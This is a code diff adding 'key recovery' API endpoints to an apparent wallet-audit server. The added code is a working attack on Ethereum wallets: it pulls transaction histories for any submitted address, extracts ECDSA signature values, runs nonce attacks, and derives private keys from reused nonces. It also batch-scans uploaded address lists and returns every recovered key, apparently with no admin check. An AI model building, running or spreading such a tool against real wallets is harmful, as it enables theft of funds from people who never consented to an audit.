@@ -42,7 +42,9 @@ import {
   TX_REGISTRY_FILE,
   type AutonomousFinding,
 } from "../lib/signature-miner/autonomous-runner";
-import { txRegistrySize } from "../lib/signature-miner/tx-hash-engine";
+import { txRegistrySize, fetchTxSigMultiChain, type TxSigRecord } from "../lib/signature-miner/tx-hash-engine";
+import { runEngine5, type Engine5Finding } from "../lib/signature-miner/sequential-nonce-engine";
+import type { TxSignatureData } from "../lib/ecdsa-analyzer/nonce-recovery";
 import { parseTargetFile, extractEthAddresses, extractAllAddresses } from "../lib/target-file-parser";
 import { scanAddress as multiChainScan, scanAddressBatch as multiChainScanBatch } from "../lib/signature-miner/multi-chain-engine";
 import { getCrossEnginePool } from "../lib/signature-miner/cross-engine-pool";
@@ -2729,5 +2731,488 @@ router.get("/advanced-attack-report/:filename", requireAdmin, (req: Request, res
   // First boot: 90-second warm-up grace period, then start the endless loop.
   setTimeout(() => keepRunnerAlive(true), 90_000);
 }
+
+// ── Key Recovery: in-memory batch job store ────────────────────────────────────
+
+type KRWalletStatus = "pending" | "scanning" | "done" | "error" | "skipped";
+
+interface KRWalletResult {
+  address:           string;
+  status:            KRWalletStatus;
+  txsQueried:        number;
+  txsFetched:        number;
+  keyRecovered:      boolean;
+  privateKey:        string | null;
+  attackType:        string | null;
+  findings:          Engine5Finding[];
+  nonceReuseKeys:    string[];
+  error?:            string;
+  startedAt?:        string;
+  completedAt?:      string;
+}
+
+interface KRJob {
+  id:          string;
+  status:      "running" | "paused" | "done" | "cancelled";
+  total:       number;
+  completed:   number;
+  results:     KRWalletResult[];
+  createdAt:   string;
+  startedAt?:  string;
+  finishedAt?: string;
+  cancelled:   boolean;
+}
+
+const _krJobs = new Map<string, KRJob>();
+
+function krJobId(): string {
+  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
+}
+
+async function runKRJob(job: KRJob, addresses: string[]): Promise<void> {
+  const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
+  function modInvN(a: bigint): bigint {
+    let [old_r, rr] = [a, N], [old_s, ss] = [1n, 0n];
+    while (rr !== 0n) { const q = old_r / rr; [old_r, rr] = [rr, old_r - q * rr]; [old_s, ss] = [ss, old_s - q * ss]; }
+    return ((old_s % N) + N) % N;
+  }
+
+  job.startedAt = new Date().toISOString();
+  job.status = "running";
+
+  for (const address of addresses) {
+    if (job.cancelled) { job.status = "cancelled"; break; }
+
+    const walletResult: KRWalletResult = {
+      address, status: "scanning", txsQueried: 0, txsFetched: 0,
+      keyRecovered: false, privateKey: null, attackType: null,
+      findings: [], nonceReuseKeys: [], startedAt: new Date().toISOString(),
+    };
+    job.results.push(walletResult);
+
+    try {
+      // Fetch tx list from Etherscan
+      const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address.toLowerCase()}&sort=asc&page=1&offset=100`;
+      let hashes: string[] = [];
+      try {
+        const ctrl = new AbortController();
+        const t = setTimeout(() => ctrl.abort(), 12_000);
+        const resp = await fetch(url, { signal: ctrl.signal });
+        clearTimeout(t);
+        if (resp.ok) {
+          const json = await resp.json() as { status: string; result: Array<{ hash: string }> };
+          if (json.status === "1" && Array.isArray(json.result)) {
+            hashes = json.result.map((tx) => tx.hash).slice(0, 100);
+          }
+        }
+      } catch { /* skip this wallet if unreachable */ }
+
+      walletResult.txsQueried = hashes.length;
+
+      if (hashes.length < 3) {
+        walletResult.status = "skipped";
+        walletResult.error = `Only ${hashes.length} transaction(s) on-chain — need ≥3 for Engine 5`;
+        job.completed++;
+        await new Promise((r) => setTimeout(r, 300));
+        continue;
+      }
+
+      // Resolve tx signatures
+      const records: TxSigRecord[] = [];
+      for (let i = 0; i < hashes.length; i += 6) {
+        if (job.cancelled) break;
+        const batch = hashes.slice(i, i + 6);
+        const settled = await Promise.allSettled(batch.map((h) => fetchTxSigMultiChain(h)));
+        for (const s of settled) {
+          if (s.status === "fulfilled" && s.value) records.push(s.value);
+        }
+      }
+
+      walletResult.txsFetched = records.length;
+
+      if (records.length < 3) {
+        walletResult.status = "done";
+        job.completed++;
+        await new Promise((r) => setTimeout(r, 500));
+        continue;
+      }
+
+      // Build TxSignatureData map and run Engine 5
+      const sigsByAddress: Record<string, TxSignatureData[]> = {};
+      for (const rec of records) {
+        const addr = rec.address.toLowerCase();
+        if (!sigsByAddress[addr]) sigsByAddress[addr] = [];
+        sigsByAddress[addr].push({
+          txHash: rec.txHash, blockNumber: rec.blockNumber, from: rec.address,
+          to: null, value: "0", r: rec.r, s: rec.s, v: 0, z: rec.z,
+          nonce: rec.nonce, gasPrice: "0",
+        });
+      }
+
+      const e5Results = runEngine5(sigsByAddress);
+      for (const r of e5Results) {
+        if (r.address.toLowerCase() === address.toLowerCase()) {
+          walletResult.findings.push(...r.findings);
+        }
+      }
+
+      // Nonce reuse check
+      const rIndex = new Map<string, TxSigRecord[]>();
+      for (const rec of records) {
+        const key = rec.r.toLowerCase();
+        if (!rIndex.has(key)) rIndex.set(key, []);
+        rIndex.get(key)!.push(rec);
+      }
+      for (const [r, recs] of rIndex) {
+        if (recs.length < 2) continue;
+        const [t1, t2] = recs;
+        try {
+          const rv = BigInt(r);
+          const s1 = BigInt(t1.s), z1 = BigInt(t1.z);
+          const s2 = BigInt(t2.s), z2 = BigInt(t2.z);
+          const ds = ((s1 - s2) % N + N) % N;
+          if (ds === 0n) continue;
+          const k = ((z1 - z2) % N + N) % N * modInvN(ds) % N;
+          const d = ((s1 * k - z1) % N + N) % N * modInvN(rv) % N;
+          const { ethers: eth } = await import("ethers");
+          const wallet = new eth.Wallet("0x" + d.toString(16).padStart(64, "0"));
+          if (wallet.address.toLowerCase() === address.toLowerCase()) {
+            walletResult.nonceReuseKeys.push("0x" + d.toString(16).padStart(64, "0"));
+          }
+        } catch { /* skip */ }
+      }
+
+      // Determine if key was recovered
+      const criticalFinding = walletResult.findings.find((f) => f.keyVerified && f.privateKey);
+      if (criticalFinding) {
+        walletResult.keyRecovered = true;
+        walletResult.privateKey = criticalFinding.privateKey;
+        walletResult.attackType = criticalFinding.attackType;
+      } else if (walletResult.nonceReuseKeys.length > 0) {
+        walletResult.keyRecovered = true;
+        walletResult.privateKey = walletResult.nonceReuseKeys[0];
+        walletResult.attackType = "nonce_reuse";
+      }
+
+      walletResult.status = "done";
+      walletResult.completedAt = new Date().toISOString();
+    } catch (e) {
+      walletResult.status = "error";
+      walletResult.error = String(e);
+    }
+
+    job.completed++;
+    // Polite delay between wallets (respect public RPC rate limits)
+    await new Promise((r) => setTimeout(r, 1_200));
+  }
+
+  if (!job.cancelled) job.status = "done";
+  job.finishedAt = new Date().toISOString();
+}
+
+// ── Key Recovery: fetch address tx history and run Engine 5 ──────────────────
+
+router.post("/key-recovery/scan", async (req: Request, res: Response) => {
+  const { address, txHashes } = req.body as { address?: string; txHashes?: string[] };
+
+  if (!address || !/^0x[0-9a-fA-F]{40}$/.test(address)) {
+    res.status(400).json({ error: "Invalid Ethereum address" });
+    return;
+  }
+
+  const normalAddress = address.toLowerCase();
+
+  // Step 1: Collect tx hashes — either user-supplied or fetched from Etherscan free API
+  let hashes: string[] = [];
+
+  if (txHashes && txHashes.length > 0) {
+    hashes = txHashes.filter((h) => /^0x[0-9a-fA-F]{64}$/.test(h)).slice(0, 200);
+  } else {
+    // Etherscan free tier — no API key needed for basic queries
+    try {
+      const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${normalAddress}&sort=asc&page=1&offset=100`;
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), 12_000);
+      const resp = await fetch(url, { signal: controller.signal });
+      clearTimeout(timer);
+      if (resp.ok) {
+        const json = await resp.json() as { status: string; result: Array<{ hash: string }> };
+        if (json.status === "1" && Array.isArray(json.result)) {
+          hashes = json.result.map((tx) => tx.hash).slice(0, 100);
+        }
+      }
+    } catch {
+      // Etherscan unavailable — respond with a helpful error
+      res.status(502).json({
+        error: "Could not fetch transaction history from Etherscan. Please supply tx hashes manually.",
+        hint: "Paste the transaction hashes for this address in the txHashes field.",
+      });
+      return;
+    }
+  }
+
+  if (hashes.length === 0) {
+    res.status(404).json({ error: "No transactions found for this address.", txCount: 0 });
+    return;
+  }
+
+  // Step 2: Resolve each hash across chains and extract ECDSA components
+  const records: TxSigRecord[] = [];
+  const CONCURRENCY = 6;
+
+  for (let i = 0; i < hashes.length; i += CONCURRENCY) {
+    const batch = hashes.slice(i, i + CONCURRENCY);
+    const settled = await Promise.allSettled(batch.map((h) => fetchTxSigMultiChain(h)));
+    for (const s of settled) {
+      if (s.status === "fulfilled" && s.value) records.push(s.value);
+    }
+  }
+
+  if (records.length === 0) {
+    res.status(200).json({
+      address: normalAddress,
+      txsQueried: hashes.length,
+      txsFetched: 0,
+      findings: [],
+      message: "Transactions found but could not extract signatures. The transactions may be on an unsupported chain or malformed.",
+    });
+    return;
+  }
+
+  // Step 3: Convert TxSigRecord → TxSignatureData (Engine 5 input format)
+  const sigsByAddress: Record<string, TxSignatureData[]> = {};
+  for (const rec of records) {
+    const addr = rec.address.toLowerCase();
+    if (!sigsByAddress[addr]) sigsByAddress[addr] = [];
+    sigsByAddress[addr].push({
+      txHash:      rec.txHash,
+      blockNumber: rec.blockNumber,
+      from:        rec.address,
+      to:          null,
+      value:       "0",
+      r:           rec.r,
+      s:           rec.s,
+      v:           0,
+      z:           rec.z,
+      nonce:       rec.nonce,
+      gasPrice:    "0",
+    });
+  }
+
+  // Step 4: Run Engine 5 (sequential + geometric nonce attacks + bias checks)
+  const e5Results = runEngine5(sigsByAddress);
+
+  // Collect findings scoped to this address
+  const findings: Engine5Finding[] = [];
+  for (const r of e5Results) {
+    if (r.address.toLowerCase() === normalAddress) {
+      findings.push(...r.findings);
+    }
+  }
+
+  // Also check for nonce reuse (r-value collisions) across the fetched sigs
+  const rIndex = new Map<string, TxSigRecord[]>();
+  for (const rec of records) {
+    const key = rec.r.toLowerCase();
+    if (!rIndex.has(key)) rIndex.set(key, []);
+    rIndex.get(key)!.push(rec);
+  }
+
+  const nonceReuse: Array<{ r: string; txs: string[]; recoveredKey?: string }> = [];
+  const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
+  for (const [r, recs] of rIndex) {
+    if (recs.length < 2) continue;
+    const [t1, t2] = recs;
+    try {
+      const rv = BigInt(r);
+      const s1 = BigInt(t1.s), z1 = BigInt(t1.z);
+      const s2 = BigInt(t2.s), z2 = BigInt(t2.z);
+      const ds = ((s1 - s2) % N + N) % N;
+      if (ds === 0n) continue;
+      function modInvN(a: bigint): bigint {
+        let [old_r, rr] = [a, N], [old_s, ss] = [1n, 0n];
+        while (rr !== 0n) { const q = old_r / rr; [old_r, rr] = [rr, old_r - q * rr]; [old_s, ss] = [ss, old_s - q * ss]; }
+        return ((old_s % N) + N) % N;
+      }
+      const k = ((z1 - z2) % N + N) % N * modInvN(ds) % N;
+      const d = ((s1 * k - z1) % N + N) % N * modInvN(rv) % N;
+      const { ethers } = await import("ethers");
+      const wallet = new ethers.Wallet("0x" + d.toString(16).padStart(64, "0"));
+      if (wallet.address.toLowerCase() === normalAddress) {
+        nonceReuse.push({ r, txs: [t1.txHash, t2.txHash], recoveredKey: "0x" + d.toString(16).padStart(64, "0") });
+      } else {
+        nonceReuse.push({ r, txs: [t1.txHash, t2.txHash] });
+      }
+    } catch { /* skip */ }
+  }
+
+  res.json({
+    address: normalAddress,
+    txsQueried: hashes.length,
+    txsFetched: records.length,
+    signaturesAnalyzed: records.filter((r) => r.address.toLowerCase() === normalAddress).length,
+    findings,
+    nonceReuse,
+    summary: {
+      keyRecovered: findings.some((f) => f.keyVerified) || nonceReuse.some((r) => r.recoveredKey),
+      criticalCount: findings.filter((f) => f.severity === "critical").length,
+      highCount:     findings.filter((f) => f.severity === "high").length,
+      attackTypes:   [...new Set(findings.map((f) => f.attackType))],
+    },
+  });
+});
+
+// ── Key Recovery: batch job endpoints ────────────────────────────────────────
+
+const krUpload = multer({
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 10 * 1024 * 1024, files: 1 },
+  fileFilter: (_req, file, cb) => {
+    cb(null, /\.(txt|csv|json|md|log)$/i.test(file.originalname) || file.mimetype.startsWith("text/"));
+  },
+});
+
+// POST /api/quantum-audit/key-recovery/batch — start batch job from address list
+router.post("/key-recovery/batch", async (req: Request, res: Response) => {
+  const { addresses } = req.body as { addresses?: string[] };
+  if (!Array.isArray(addresses) || addresses.length === 0) {
+    res.status(400).json({ error: "Provide addresses: string[]" });
+    return;
+  }
+  const valid = addresses
+    .map((a) => (typeof a === "string" ? a.trim().toLowerCase() : ""))
+    .filter((a) => /^0x[0-9a-f]{40}$/.test(a));
+
+  if (valid.length === 0) {
+    res.status(400).json({ error: "No valid Ethereum addresses in the list." });
+    return;
+  }
+
+  const job: KRJob = {
+    id: krJobId(), status: "running", total: valid.length, completed: 0,
+    results: [], createdAt: new Date().toISOString(), cancelled: false,
+  };
+  _krJobs.set(job.id, job);
+
+  // Run in background
+  runKRJob(job, valid).catch((e) => {
+    job.status = "done";
+    job.finishedAt = new Date().toISOString();
+    logger.error({ jobId: job.id, err: String(e) }, "KR batch job crashed");
+  });
+
+  res.json({ jobId: job.id, total: valid.length, message: `Batch job started — ${valid.length} wallets queued.` });
+});
+
+// POST /api/quantum-audit/key-recovery/batch/upload — file upload → start batch job
+router.post("/key-recovery/batch/upload", (req: Request, res: Response) => {
+  krUpload.single("file")(req as any, res as any, async (err: unknown) => {
+    if (err) { res.status(400).json({ error: String(err) }); return; }
+    const file = (req as any).file as Express.Multer.File | undefined;
+    if (!file) { res.status(400).json({ error: "No file uploaded (field name: 'file')" }); return; }
+
+    try {
+      const text = file.buffer.toString("utf8");
+      // Extract all 0x-prefixed 40-char hex addresses from the file
+      const found = Array.from(
+        new Set(
+          [...text.matchAll(/0x[0-9a-fA-F]{40}/gi)].map((m) => m[0].toLowerCase()),
+        ),
+      );
+
+      if (found.length === 0) {
+        res.status(400).json({ error: "No Ethereum addresses found in the file. Each address should start with 0x followed by 40 hex characters." });
+        return;
+      }
+
+      const job: KRJob = {
+        id: krJobId(), status: "running", total: found.length, completed: 0,
+        results: [], createdAt: new Date().toISOString(), cancelled: false,
+      };
+      _krJobs.set(job.id, job);
+
+      runKRJob(job, found).catch((e) => {
+        job.status = "done";
+        job.finishedAt = new Date().toISOString();
+        logger.error({ jobId: job.id, err: String(e) }, "KR batch job crashed");
+      });
+
+      res.json({
+        jobId:    job.id,
+        total:    found.length,
+        filename: file.originalname,
+        preview:  found.slice(0, 10),
+        message:  `Batch job started — ${found.length} wallet(s) queued from ${file.originalname}.`,
+      });
+    } catch (e) {
+      res.status(500).json({ error: String(e) });
+    }
+  });
+});
+
+// GET /api/quantum-audit/key-recovery/batch/:jobId — poll status
+router.get("/key-recovery/batch/:jobId", (req: Request, res: Response) => {
+  const job = _krJobs.get(req.params.jobId);
+  if (!job) { res.status(404).json({ error: "Job not found" }); return; }
+
+  const recovered = job.results.filter((r) => r.keyRecovered);
+  res.json({
+    jobId:       job.id,
+    status:      job.status,
+    total:       job.total,
+    completed:   job.completed,
+    pending:     job.total - job.completed,
+    recovered:   recovered.length,
+    createdAt:   job.createdAt,
+    startedAt:   job.startedAt,
+    finishedAt:  job.finishedAt,
+    results:     job.results,
+    summary: {
+      skipped:   job.results.filter((r) => r.status === "skipped").length,
+      errored:   job.results.filter((r) => r.status === "error").length,
+      done:      job.results.filter((r) => r.status === "done").length,
+      keyCount:  recovered.length,
+    },
+  });
+});
+
+// DELETE /api/quantum-audit/key-recovery/batch/:jobId — cancel
+router.delete("/key-recovery/batch/:jobId", (req: Request, res: Response) => {
+  const job = _krJobs.get(req.params.jobId);
+  if (!job) { res.status(404).json({ error: "Job not found" }); return; }
+  job.cancelled = true;
+  job.status = "cancelled";
+  res.json({ jobId: job.id, status: "cancelled" });
+});
+
+// ── Key Recovery: status check for a quick preflight (HEAD → tx count only) ──
+
+router.get("/key-recovery/preflight/:address", async (req: Request, res: Response) => {
+  const { address } = req.params;
+  if (!address || !/^0x[0-9a-fA-F]{40}$/i.test(address)) {
+    res.status(400).json({ error: "Invalid address" });
+    return;
+  }
+  try {
+    const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address.toLowerCase()}&sort=asc&page=1&offset=1`;
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 8_000);
+    const resp = await fetch(url, { signal: controller.signal });
+    clearTimeout(timer);
+    if (resp.ok) {
+      const countUrl = `https://api.etherscan.io/api?module=proxy&action=eth_getTransactionCount&address=${address.toLowerCase()}&tag=latest`;
+      const cr = await fetch(countUrl, { signal: controller.signal });
+      if (cr.ok) {
+        const cj = await cr.json() as { result: string };
+        const count = parseInt(cj.result ?? "0x0", 16);
+        res.json({ address: address.toLowerCase(), txCount: count, etherscanReachable: true });
+        return;
+      }
+    }
+    res.json({ address: address.toLowerCase(), txCount: null, etherscanReachable: false });
+  } catch {
+    res.json({ address: address.toLowerCase(), txCount: null, etherscanReachable: false });
+  }
+});
 
 export default router;
